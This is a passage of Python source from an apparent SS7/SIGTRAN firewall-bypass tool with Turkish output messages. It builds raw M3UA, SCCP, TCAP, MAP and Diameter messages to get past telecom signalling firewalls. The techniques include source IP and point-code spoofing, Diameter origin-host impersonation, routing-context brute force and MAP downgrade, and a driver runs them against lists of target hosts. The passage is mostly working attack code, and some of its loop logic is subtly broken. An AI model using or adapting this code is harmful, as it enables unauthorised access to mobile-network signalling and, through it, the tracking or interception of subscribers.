            asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
            sk.send(asp_up)

            try:
                resp = sk.recv(4096)
                parsed = _parse_m3ua_response(resp)
                if parsed:
                    if parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                        results.append({
                            'technique': 'SCTP M3UA ASP Up',
                            'success': True,
                            'response': 'SCTP + M3UA ASP Up Ack = TAM ERISIM!',
                            'level': 'CRITICAL'
                        })

                        # Try ASP Active
                        asp_active = _build_m3ua(ASPTM_CLASS, ASPAC)
                        sk.send(asp_active)
                        try:
                            resp2 = sk.recv(4096)
                            parsed2 = _parse_m3ua_response(resp2)
                            if parsed2 and parsed2.get('class') == ASPTM_CLASS and parsed2.get('msg_type') == ASPAC_ACK:
                                results.append({
                                    'technique': 'SCTP M3UA ASP Active',
                                    'success': True,
                                    'response': 'ASP Active Ack = FULL M3UA SESSION!',
                                    'level': 'CRITICAL'
                                })
                        except Exception:
                            pass
                    else:
                        results.append({
                            'technique': 'SCTP M3UA',
                            'success': True,
                            'response': f'SCTP yanit: {parsed.get("desc", "bilinmiyor")}',
                            'level': 'HIGH'
                        })
            except socket.timeout:
                results.append({
                    'technique': 'SCTP M3UA',
                    'success': True,
                    'response': 'SCTP acik ama M3UA timeout (firewall SCTP de filtreliyor)',
                    'level': 'MEDIUM'
                })
            except Exception as e:
                results.append({
                    'technique': 'SCTP M3UA',
                    'success': True,
                    'response': f'SCTP acik, M3UA hata: {str(e)[:40]}',
                    'level': 'MEDIUM'
                })

            sk.close()
            return results
        except socket.timeout:
            results.append({
                'technique': 'SCTP Native',
                'success': False,
                'response': 'SCTP timeout (port kapali veya filtreleniyor)',
                'level': 'INFO'
            })
            return results
        except ConnectionRefusedError:
            results.append({
                'technique': 'SCTP Native',
                'success': False,
                'response': 'SCTP reddedildi (port acik degil)',
                'level': 'INFO'
            })
            return results
        except OSError as e:
            if 'Protocol not supported' in str(e):
                pass  # SCTP not supported on this OS, try raw
            else:
                results.append({
                    'technique': 'SCTP Native',
                    'success': False,
                    'response': f'SCTP OS hatasi: {str(e)[:40]}',
                    'level': 'INFO'
                })
                return results
        except Exception:
            pass
    
    # Method 2: Raw socket SCTP INIT
    try:
        # IPPROTO_SCTP = 132
        IPPROTO_SCTP = 132
        
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_SCTP)
        raw_sock.settimeout(timeout)
        
        # Build SCTP INIT packet
        src_port = random.randint(30000, 60000)
        init_tag = random.randint(1, 0xFFFFFFFF)
        init_tsn = random.randint(1, 0xFFFFFFFF)
        
        # SCTP header (12 bytes)
        sctp_hdr = struct.pack('!HHII',
                                src_port,    # Source Port
                                port,        # Dest Port
                                0,           # Verification Tag (0 for INIT)
                                0)           # Checksum (placeholder)
        
        # INIT chunk (20 bytes)
        init_chunk = struct.pack('!BBHIHHI',
                                  1,          # Type: INIT
                                  0,          # Flags
                                  20,         # Length
                                  init_tag,   # Initiate Tag
                                  65535,      # A-RWND
                                  10,         # Num Outbound Streams
                                  10,         # Num Inbound Streams
                                  init_tsn)   # Initial TSN
        
        packet = sctp_hdr + init_chunk
        
        # Calculate CRC32c checksum
        crcmod = _optional_import("crcmod")
        if crcmod:
            crc32c_fn = crcmod.predefined.mkCrcFun('crc-32c')
            pkt_for_csum = packet[:8] + b'\x00\x00\x00\x00' + packet[12:]
            checksum = crc32c_fn(pkt_for_csum)
            packet = packet[:8] + struct.pack('<I', checksum) + packet[12:]
        else:
            pkt_for_csum = packet[:8] + b'\x00\x00\x00\x00' + packet[12:]
            checksum = _crc32c(pkt_for_csum)
            packet = packet[:8] + struct.pack('!I', checksum) + packet[12:]  # Big-endian per RFC 4960
        
        raw_sock.sendto(packet, (ip, port))
        
        try:
            resp, addr = raw_sock.recvfrom(4096)
            if resp and len(resp) >= 12:
                # Check if SCTP INIT-ACK (chunk type 2)
                # Extract IP header length from IHL field
                ip_hdr_len = (resp[0] & 0x0F) * 4 if len(resp) > 0 else 20
                sctp_data = resp[ip_hdr_len:] if len(resp) > ip_hdr_len + 12 else resp
                if len(sctp_data) >= 16:
                    chunk_type = sctp_data[12] if len(sctp_data) > 12 else 0
                    if chunk_type == 2:  # INIT-ACK
                        results.append({
                            'technique': 'Raw SCTP INIT',
                            'success': True,
                            'response': 'SCTP INIT-ACK alindi! SCTP portu ACIK!',
                            'level': 'CRITICAL'
                        })
                    elif chunk_type == 6:  # ABORT
                        results.append({
                            'technique': 'Raw SCTP INIT',
                            'success': False,
                            'response': 'SCTP ABORT (port acik ama reddetti)',
                            'level': 'INFO'
                        })
                    else:
                        results.append({
                            'technique': 'Raw SCTP INIT',
                            'success': True,
                            'response': f'SCTP yanit (chunk_type={chunk_type})',
                            'level': 'HIGH'
                        })
        except socket.timeout:
            results.append({
                'technique': 'Raw SCTP INIT',
                'success': False,
                'response': 'SCTP timeout',
                'level': 'INFO'
            })
        
        raw_sock.close()
        
    except PermissionError:
        results.append({
            'technique': 'Raw SCTP',
            'success': False,
            'response': 'Root/sudo gerekli (raw socket)',
            'level': 'INFO'
        })
    except OSError as e:
        if 'not permitted' in str(e).lower() or 'not supported' in str(e).lower():
            results.append({
                'technique': 'Raw SCTP',
                'success': False,
                'response': f'OS desteklemiyor: {str(e)[:30]}',
                'level': 'INFO'
            })
        else:
            results.append({
                'technique': 'Raw SCTP',
                'success': False,
                'response': str(e)[:40],
                'level': 'INFO'
            })
    except Exception as e:
        results.append({
            'technique': 'Raw SCTP',
            'success': False,
            'response': str(e)[:40],
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 12: Source Port Manipulation
# ============================================

def bypass_source_port(ip, port, timeout=5):
    """
    Use specific source ports that might be whitelisted.
    Some firewalls allow traffic from known SIGTRAN ports.
    """
    results = []
    
    # Try binding to common SIGTRAN source ports
    privileged_ports = [2905, 2904, 2906, 14001, 3868, 7626]
    
    for src_port in privileged_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(min(timeout, 3))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            try:
                sock.bind(('', src_port))
            except OSError:
                sock.close()
                continue  # Port in use or no permission
            
            sock.connect((ip, port))
            
            # Connected! Send ASP Up
            asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
            sock.send(asp_up)
            
            try:
                resp = sock.recv(1024)
                parsed = _parse_m3ua_response(resp)
                if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                    results.append({
                        'technique': f'Source Port {src_port}',
                        'success': True,
                        'response': f'ASP Up Ack! (src_port={src_port} whitelist)',
                        'level': 'CRITICAL'
                    })
                    sock.close()
                    return results
                elif parsed and parsed.get('type') not in ('RESET', 'BROKEN', None):
                    results.append({
                        'technique': f'Source Port {src_port}',
                        'success': False,
                        'response': f'Yanit: {parsed.get("desc", "?")}',
                        'level': 'INFO'
                    })
            except (socket.timeout, ConnectionResetError):
                pass
            
            sock.close()
        except PermissionError:
            # Need root for ports < 1024 (not our case, SIGTRAN ports > 1024)
            pass
        except OSError:
            pass
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 13: SCTP Dynamic Multi-Homing
# ============================================

def bypass_sctp_multihoming(ip, port, timeout=5):
    """
    SCTP Multi-Homing Bypass - Rotate source IP addresses.
    Some firewalls whitelist specific IP ranges but miss multi-homed setups.
    Uses raw socket to spoof source IPs from telecom ranges.
    """
    results = []
    
    # Telecom IP ranges that might be whitelisted
    telecom_ranges = [
        '213.0.0.1', '213.1.0.1', '213.2.0.1',  # Common EU telecom
        '195.0.0.1', '195.1.0.1', '195.2.0.1',  # EU ranges
        '31.0.0.1', '31.1.0.1', '31.2.0.1',     # Mobile ranges
        '46.0.0.1', '46.1.0.1', '46.2.0.1',     # Mobile ranges
    ]
    
    try:
        # Try raw socket for IP spoofing (requires root/admin)
        import socket as s
        try:
            raw_sock = s.socket(s.AF_INET, s.SOCK_RAW, s.IPPROTO_RAW)
        except (PermissionError, OSError):
            # Fallback: try binding to local interfaces
            for spoof_ip in telecom_ranges[:3]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    # Try to bind (will fail if IP not local, but worth trying)
                    try:
                        sock.bind((spoof_ip, 0))
                    except OSError:
                        pass  # Continue anyway
                    
                    sock.connect((ip, port))
                    
                    # Send M3UA ASP UP with multi-homing indication
                    m3ua = _build_m3ua(ASPSM_CLASS, ASPUP, b'')
                    sock.send(m3ua)
                    
                    try:
                        resp = sock.recv(1024)
                        if resp:
                            parsed = _parse_m3ua_response(resp)
                            if parsed.get('msg_type') == ASPUP_ACK:
                                results.append({
                                    'technique': 'SCTP Multi-Homing',
                                    'success': True,
                                    'response': f'Multi-homing ASP UP ACK (src: {spoof_ip})',
                                    'level': 'HIGH'
                                })
                                break
                    except socket.timeout:
                        pass
                    sock.close()
                except Exception:
                    pass
        finally:
            try:
                raw_sock.close()
            except:
                pass
    except Exception:
        pass
    
    if not results:
        results.append({
            'technique': 'SCTP Multi-Homing',
            'success': False,
            'response': 'Multi-homing bypass basarisiz',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 14: M3UA Routing Context Manipulation
# ============================================

def bypass_routing_context(ip, port, timeout=5):
    """
    M3UA Routing Context Bypass - Try all known routing contexts.
    Some firewalls only filter default RC (0), allowing specific RCs.
    """
    results = []
    
    # Extended routing contexts including operator-specific values
    extended_rcs = [0, 1, 2, 3, 4, 5, 10, 100, 200, 255, 256, 1000,
                    1001, 1002, 2000, 2001, 5000, 9999]
    
    for rc in extended_rcs:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build ASP UP with specific routing context
            rc_param = struct.pack('!I', rc)
            rc_tlv = _build_param(TAG_ROUTING_CONTEXT, rc_param)
            m3ua = _build_m3ua(ASPSM_CLASS, ASPUP, rc_tlv)
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp:
                    parsed = _parse_m3ua_response(resp)
                    if parsed.get('msg_type') == ASPUP_ACK:
                        results.append({
                            'technique': f'Routing Context {rc}',
                            'success': True,
                            'response': f'ASP UP ACK with RC={rc}',
                            'level': 'HIGH' if rc != 0 else 'INFO'
                        })
                        break  # Found working RC
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'Routing Context',
            'success': False,
            'response': 'Tum RC degerleri engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 15: SCCP GTT (Global Title Translation) Abuse
# ============================================

def bypass_sccp_gtt(ip, port, timeout=5):
    """
    SCCP GTT Bypass - Use Global Title Translation to route through.
    Some firewalls don't inspect GTT properly, allowing translation-based routing.
    """
    results = []
    
    # GTT formats that might bypass inspection
    gtt_formats = [
        # E.164 format (international)
        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09',  # +1234567890
        # E.214 format (mobile)
        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09\x21',
        # E.212 format (IMSI-based)
        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09\x21\x43',
        # Translation type variations
        b'\x04\x00\x01\x00\x01',  # TT=0x0001
        b'\x04\x00\x02\x00\x01',  # TT=0x0002
        b'\x04\x00\x04\x00\x01',  # TT=0x0004
    ]
    
    for gtt in gtt_formats:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build SCCP UDT with GTT
            # Called party with GTT
            called_addr = b'\x00\x00' + gtt  # SSN=0, GTT present
            # Calling party (local)
            calling_addr = b'\x00\x06\x00\x00'  # SSN=6, no GT
            
            # SCCP UDT header
            sccp = b'\x09\x00\x00\x00'  # UDT, protocol class 0
            sccp += struct.pack('!B', len(called_addr)) + called_addr
            sccp += struct.pack('!B', len(calling_addr)) + calling_addr
            
            # M3UA payload
            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 20:
                    results.append({
                        'technique': 'SCCP GTT',
                        'success': True,
                        'response': f'GTT yanit alindi ({len(resp)} bytes)',
                        'level': 'HIGH'
                    })
                    break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'SCCP GTT',
            'success': False,
            'response': 'GTT bypass basarisiz',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 16: MAP Version Downgrade
# ============================================

def bypass_map_downgrade(ip, port, timeout=5):
    """
    MAP Version Downgrade Bypass - Try older MAP versions.
    Some firewalls only inspect MAP v3, allowing v2/v1 traffic.
    """
    results = []
    
    # MAP versions to try (v3=3, v2=2, v1=1)
    map_versions = [3, 2, 1]
    
    for version in map_versions:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build TCAP with specific MAP version indicator
            # Application context name varies by version
            if version == 3:
                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x03'  # MAP v3
            elif version == 2:
                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x02'  # MAP v2
            else:
                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x01'  # MAP v1
            
            # Build TCAP BEGIN with version-specific ACN
            tcap = b'\x62'  # BEGIN tag
            tcap += struct.pack('!B', len(acn_oid) + 20)  # Length
            tcap += b'\xA1'  # Dialogue portion
            tcap += struct.pack('!B', len(acn_oid) + 2)
            tcap += b'\x06' + struct.pack('!B', len(acn_oid)) + acn_oid
            
            # Add invoke component (dummy SRI)
            tcap += b'\xA2'  # Components
            tcap += b'\x10'  # Length
            tcap += b'\x02\x01\x01'  # Invoke ID
            tcap += b'\x02\x01\x2C'  # SRI opcode
            
            # Wrap in SCCP UDT
            sccp = b'\x09\x00\x00\x00'  # UDT
            sccp += b'\x07\x00\x06\x00\x00'  # Called addr
            sccp += b'\x07\x00\x08\x00\x00'  # Calling addr
            sccp += struct.pack('!H', len(tcap)) + tcap
            
            # M3UA wrapper
            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 30:
                    results.append({
                        'technique': f'MAP v{version}',
                        'success': True,
                        'response': f'MAP v{version} yanit alindi',
                        'level': 'HIGH' if version < 3 else 'INFO'
                    })
                    break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'MAP Downgrade',
            'success': False,
            'response': 'Tum MAP versiyonlari engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 17: TCAP Dialogue ID Prediction
# ============================================

def bypass_tcap_did(ip, port, timeout=5):
    """
    TCAP Dialogue ID Prediction/Hijacking Bypass.
    Try predictable DIDs that might be whitelisted or expected.
    """
    results = []
    
    # Common/predictable TCAP Dialogue IDs
    common_dids = [
        0x00000000,  # Default/zero
        0x00000001,  # First session
        0x00000100,  # Round number
        0x00001000,  # Common increment
        0x12345678,  # Test pattern
        0xDEADBEEF,  # Debug pattern
        0xFFFFFFFF,  # Max value
    ]
    
    for did in common_dids:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build TCAP with specific Dialogue ID
            otid = struct.pack('!I', did)
            
            # TCAP BEGIN with custom DID
            tcap = b'\x62'  # BEGIN
            tcap += b'\x1E'  # Length
            tcap += b'\xA1\x10'  # Dialogue portion
            tcap += b'\x06\x07\x04\x00\x00\x01\x00\x01\x03'  # ACN
            tcap += b'\xA2\x0A'  # Components
            tcap += b'\x02\x01\x01'  # Invoke ID
            tcap += b'\x02\x01\x2C'  # SRI
            tcap += b'\x02\x04' + otid  # OTID
            
            # SCCP wrapper
            sccp = b'\x09\x00\x00\x00'
            sccp += b'\x07\x00\x06\x00\x00'
            sccp += b'\x07\x00\x08\x00\x00'
            sccp += struct.pack('!H', len(tcap)) + tcap
            
            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 20:
                    results.append({
                        'technique': f'TCAP DID 0x{did:08X}',
                        'success': True,
                        'response': f'DID 0x{did:08X} kabul edildi',
                        'level': 'HIGH'
                    })
                    break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'TCAP DID',
            'success': False,
            'response': 'Tum DID degerleri engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 18: SS7 Point Code Advanced Spoofing
# ============================================

def bypass_pc_advanced(ip, port, timeout=5):
    """
    Advanced SS7 Point Code Spoofing Bypass.
    Try international and operator-specific point codes that might be trusted.
    """
    results = []
    
    # Extended point codes including international formats
    extended_pcs = [
        # ITU-T format (network-cluster-member)
        (0, 0, 1), (0, 0, 2), (0, 0, 3), (0, 0, 4),
        (0, 1, 0), (0, 1, 1), (0, 1, 2), (0, 1, 3),
        (0, 2, 0), (0, 2, 1), (0, 2, 2), (0, 2, 3),
        # ANSI format (network-cluster-member)
        (1, 0, 0), (1, 0, 1), (1, 1, 0), (1, 1, 1),
        (2, 0, 0), (2, 0, 1), (2, 1, 0), (2, 1, 1),
        # China format
        (8, 0, 0), (8, 0, 1), (8, 1, 0), (8, 1, 1),
        # India format
        (4, 0, 0), (4, 0, 1), (4, 1, 0), (4, 1, 1),
        # Special values
        (0, 0, 0),  # Null PC
        (255, 255, 255),  # Broadcast
    ]
    
    for opc, dpc in [(opc, dpc) for opc, _, _ in extended_pcs for _, dpc, _ in extended_pcs[:5]]:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build M3UA DATA with specific OPC/DPC
            opc_int = _pc_to_int(*extended_pcs[0])
            dpc_int = _pc_to_int(*extended_pcs[1])
            
            # Protocol data with PC info
            proto_data = struct.pack('!II', opc_int, dpc_int)
            proto_data += b'\x00' * 8  # Padding
            
            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, proto_data))
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 16:
                    results.append({
                        'technique': f'PC Spoof {opc}-{dpc}',
                        'success': True,
                        'response': f'PC {opc}-{dpc} kabul edildi',
                        'level': 'HIGH'
                    })
                    break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'PC Advanced',
            'success': False,
            'response': 'Tum PC kombinasyonlari engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 19: SCCP Hop Counter Manipulation
# ============================================

def bypass_sccp_hop_counter(ip, port, timeout=5):
    """
    SCCP Hop Counter Manipulation Bypass.
    Vary hop counter to bypass TTL-based filtering.
    """
    results = []
    
    # Try different hop counter values
    hop_values = [0, 1, 2, 3, 4, 5, 10, 15, 255]
    
    for hop in hop_values:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build SCCP with modified hop counter
            # SCCP UDT with hop counter in optional parameters
            sccp = b'\x09'  # UDT message type
            sccp += b'\x00'  # Protocol class 0
            sccp += struct.pack('!B', hop)  # Hop counter (abuse position)
            sccp += b'\x00\x00'  # Reserved
            
            # Called/calling addresses
            sccp += b'\x07\x00\x06\x00\x00'  # Called
            sccp += b'\x07\x00\x08\x00\x00'  # Calling
            
            # Add hop counter as optional parameter
            sccp += b'\x13'  # Hop counter parameter tag
            sccp += b'\x02'  # Length
            sccp += struct.pack('!B', hop)  # Hop value
            
            # Dummy data
            sccp += b'\x00' * 10
            
            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
            
            sock.send(m3ua)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 20:
                    results.append({
                        'technique': f'Hop Counter {hop}',
                        'success': True,
                        'response': f'Hop={hop} kabul edildi',
                        'level': 'HIGH' if hop > 5 else 'INFO'
                    })
                    break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'Hop Counter',
            'success': False,
            'response': 'Tum hop degerleri engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# BYPASS TECHNIQUE 20: Diameter Origin Rotation
# ============================================

def bypass_diameter_origin(ip, port, timeout=5):
    """
    Diameter Origin-Host/Realm Rotation Bypass.
    Try trusted origin identities that might be whitelisted.
    """
    results = []
    
    # Common Diameter origin identities that might be trusted
    trusted_origins = [
        ('hss.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
        ('hss.mnc002.mcc001.3gppnetwork.org', 'mnc002.mcc001.3gppnetwork.org'),
        ('mme.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
        ('hlr.example.com', 'example.com'),
        ('diameter.example.net', 'example.net'),
        ('sigtran.hss.local', 'local'),
        ('node1.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
    ]
    
    for origin_host, origin_realm in trusted_origins:
        try:
            sock = _safe_connect(ip, port, timeout)
            if not sock:
                continue
            
            # Build Diameter CER with custom origin
            # Diameter header (version=1, length=..., CER code=257)
            cer = b'\x01\x00\x01\x00'  # Version=1, CER
            
            # Build AVPs
            avps = b''
            
            # Origin-Host AVP (code=264)
            oh_bytes = origin_host.encode('utf-8')
            avps += struct.pack('!I', 264 << 16)  # Code with vendor flag off
            avps += struct.pack('!I', len(oh_bytes) + 8)  # Length
            avps += struct.pack('!I', 0)  # Vendor-ID (none)
            avps += oh_bytes
            
            # Origin-Realm AVP (code=296)
            or_bytes = origin_realm.encode('utf-8')
            avps += struct.pack('!I', 296 << 16)
            avps += struct.pack('!I', len(or_bytes) + 8)
            avps += struct.pack('!I', 0)
            avps += or_bytes
            
            # Complete CER
            cer_len = 20 + len(avps)
            cer += struct.pack('!I', cer_len)[1:]  # Length (3 bytes)
            cer += b'\x00\x00\x00\x00'  # Application-ID
            cer += b'\x00\x00\x00\x00'  # Hop-by-Hop ID
            cer += b'\x00\x00\x00\x00'  # End-to-End ID
            cer += avps
            
            sock.send(cer)
            
            try:
                resp = sock.recv(1024)
                if resp and len(resp) > 20:
                    # Check for CEA response
                    if resp[0:4] == b'\x01\x00\x01\x00':
                        results.append({
                            'technique': f'Diameter {origin_host[:20]}',
                            'success': True,
                            'response': f'Origin {origin_host[:20]} kabul edildi',
                            'level': 'CRITICAL'
                        })
                        break
            except socket.timeout:
                pass
            
            sock.close()
        except Exception:
            pass
    
    if not results:
        results.append({
            'technique': 'Diameter Origin',
            'success': False,
            'response': 'Tum origin degerleri engellendi',
            'level': 'INFO'
        })
    
    return results


# ============================================
# MAIN BYPASS ENGINE
# ============================================

def run_all_bypasses(ip, port, timeout=5, verbose=True):
    """
    Run all bypass techniques against a single target.
    Returns list of all results with success/fail status.
    Max ~60 seconds total.
    """
    all_results = []
    start_time = time.time()
    max_total_time = 40  # Max 40 seconds per target
    
    # Use shorter timeout for individual attempts
    t = min(timeout, 3)
    
    # Phase 1: Quick probe to detect firewall type
    # If first connection resets = active firewall (worth trying more)
    # If first connection timeouts = silent firewall (skip slow techniques)
    fw_type = 'unknown'
    try:
        probe_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe_sock.settimeout(2)
        probe_sock.connect((ip, port))
        probe_sock.send(b'\x01\x00\x03\x01\x00\x00\x00\x08')  # ASP Up
        try:
            probe_resp = probe_sock.recv(1024)
            if probe_resp:
                fw_type = 'responsive'
        except socket.timeout:
            fw_type = 'silent'  # Drops packets silently
        except ConnectionResetError:
            fw_type = 'active'  # Actively resets
        probe_sock.close()
    except socket.timeout:
        fw_type = 'timeout'  # Can't even connect
    except ConnectionResetError:
        fw_type = 'active'
    except Exception:
        fw_type = 'error'
    
    if verbose:
        fw_labels = {
            'responsive': '\033[32mYanit veriyor\033[0m',
            'active': '\033[33mAktif reset (DPI)\033[0m',
            'silent': '\033[33mSessiz drop\033[0m',
            'timeout': '\033[90mBaglanti timeout\033[0m',
            'error': '\033[90mBaglanti hatasi\033[0m',
            'unknown': '\033[90mBilinmiyor\033[0m',
        }
        print(f"    Firewall tipi: {fw_labels.get(fw_type, fw_type)}")
    
    # Skip entirely if can't even connect
    if fw_type in ('timeout', 'error'):
        if verbose:
            print(f"    \033[90m[-] TCP baglantisi kurulamiyor, atlaniyor\033[0m")
        all_results.append({'technique': 'TCP probe', 'success': False, 'response': 'TCP baglanti yok', 'level': 'INFO'})
        return all_results
    
    # SCTP is always tried first - it's the real bypass
    # TCP firewall rules often don't cover SCTP
    sctp_first = [
        ('SCTP Native', bypass_native_sctp),         # THE key technique
        ('Source Port Spoof', bypass_source_port),    # Whitelist bypass
        ('SCTP Multi-Homing', bypass_sctp_multihoming),  # IP rotation
    ]
    
    # Select remaining techniques based on firewall type
    if fw_type == 'silent':
        # Silent firewall: skip slow techniques, only try fast ones
        tcp_techniques = [
            ('Direkt SCCP', bypass_direct_sccp),
            ('M2PA', bypass_m2pa),
            ('Heartbeat Probe', bypass_heartbeat),
            ('Routing Context', bypass_routing_context),
        ]
        t = min(t, 2)  # Even shorter timeout
    elif fw_type == 'active':
        # Active firewall: try all techniques (reset = something is listening)
        tcp_techniques = [
            ('Direkt SCCP', bypass_direct_sccp),
            ('Fragmentasyon', bypass_fragmentation),
            ('M3UA Params', bypass_m3ua_params),
            ('M2PA', bypass_m2pa),
            ('Heartbeat Probe', bypass_heartbeat),
            ('SCTP Framing', bypass_sctp_frame),
            ('SCCP GTT', bypass_sccp_gtt),
            ('MAP Downgrade', bypass_map_downgrade),
            ('Routing Context', bypass_routing_context),
        ]
    else:
        # Responsive or unknown: try everything
        tcp_techniques = [
            ('Direkt SCCP', bypass_direct_sccp),
            ('M3UA Params', bypass_m3ua_params),
            ('M2PA', bypass_m2pa),
            ('Fragmentasyon', bypass_fragmentation),
            ('Heartbeat Probe', bypass_heartbeat),
            ('Versiyon Fuzzing', bypass_version_fuzz),
            ('SUA', bypass_sua),
            ('SCTP Framing', bypass_sctp_frame),
            ('SCCP GTT', bypass_sccp_gtt),
            ('MAP Downgrade', bypass_map_downgrade),
            ('TCAP DID', bypass_tcap_did),
            ('PC Advanced', bypass_pc_advanced),
            ('Hop Counter', bypass_sccp_hop_counter),
            ('Diameter Origin', bypass_diameter_origin),
        ]
    
    techniques = sctp_first + tcp_techniques
    
    critical_found = False
    total = len(techniques) + 1  # +1 for multiport
    consecutive_fails = 0
    
    for idx, (name, func) in enumerate(techniques):
        elapsed = time.time() - start_time
        if elapsed > max_total_time:
            if verbose:
                print(f"    \033[33m[!] Zaman siniri ({int(elapsed)}s)\033[0m")
            break
        
        # If 4+ consecutive fails with no useful info, skip rest
        if consecutive_fails >= 4 and fw_type == 'silent':
            if verbose:
                print(f"    \033[90m[!] Sessiz firewall - kalan teknikler anlamsiz, atlaniyor\033[0m")
            break
        
        if verbose:
            print(f"    \033[36m[{idx+1}/{total}] {name}...\033[0m", end=' ', flush=True)
        
        try:
            results = func(ip, port, t)
        except Exception as e:
            results = [{'technique': name, 'success': False, 'response': str(e), 'level': 'ERROR'}]
        
        successes = [r for r in results if r.get('success')]
        
        if successes:
            consecutive_fails = 0
        else:
            consecutive_fails += 1
        
        if verbose:
            if successes:
                for s in successes:
                    level = s.get('level', 'INFO')
                    if level == 'CRITICAL':
                        print(f"\033[31m[!!!] {s['response']}\033[0m")
                    elif level == 'HIGH':
                        print(f"\033[33m[!!] {s['response']}\033[0m")
                    else:
                        print(f"\033[32m[+] {s['response']}\033[0m")
            else:
                info_results = [r for r in results if r.get('response')]
                if info_results:
                    print(f"\033[90m[-] {info_results[0].get('response', 'Basarisiz')[:50]}\033[0m")
                else:
                    print(f"\033[90m[-] Basarisiz\033[0m")
        
        all_results.extend(results)
        
        # If we found a critical bypass, stop early
        if any(r.get('level') == 'CRITICAL' and r.get('success') for r in results):
            critical_found = True
            if verbose:
                print(f"    \033[31m[!!!] KRITIK ZAFIYET BULUNDU - Firewall bypass basarili!\033[0m")
            break
    
    # Multi-port scan at the end (quick, 2s timeout)
    elapsed = time.time() - start_time
    if not critical_found and elapsed < max_total_time:
        if verbose:
            print(f"    \033[36m[{total}/{total}] Coklu Port...\033[0m", end=' ', flush=True)
        port_results = bypass_multiport(ip, min(t, 2))
        all_results.extend(port_results)
        open_ports = [r for r in port_results if 'TCP acik' in r.get('response', '')]
        if verbose and open_ports:
            print(f"\033[32m{len(open_ports)} port acik\033[0m")
        elif verbose:
            print(f"\033[90m[-]\033[0m")
    
    if verbose:
        total_time = time.time() - start_time
        print(f"    \033[90m[{total_time:.1f}s]\033[0m")
    
    return all_results


def run_bypass_on_targets(targets, max_workers=3, timeout=5, verbose=True):
    """
    Run firewall bypass on multiple targets.
    
    Args:
        targets: list of (ip, port) tuples
        max_workers: parallel workers
        timeout: per-technique timeout
        verbose: print progress
    
    Returns:
        dict mapping (ip, port) -> results
    """
    all_results = {}
    
    for i, (ip, port) in enumerate(targets):
        if verbose:
            print(f"\n  \033[1m[{i+1}/{len(targets)}] {ip}:{port}\033[0m")
        
        results = run_all_bypasses(ip, port, timeout, verbose)
        all_results[(ip, port)] = results
        
        successes = [r for r in results if r.get('success')]
        criticals = [r for r in successes if r.get('level') == 'CRITICAL']
        
        if verbose:
            if criticals:
                print(f"  \033[31m  => {len(criticals)} KRITIK zafiyet!\033[0m")
            elif successes:
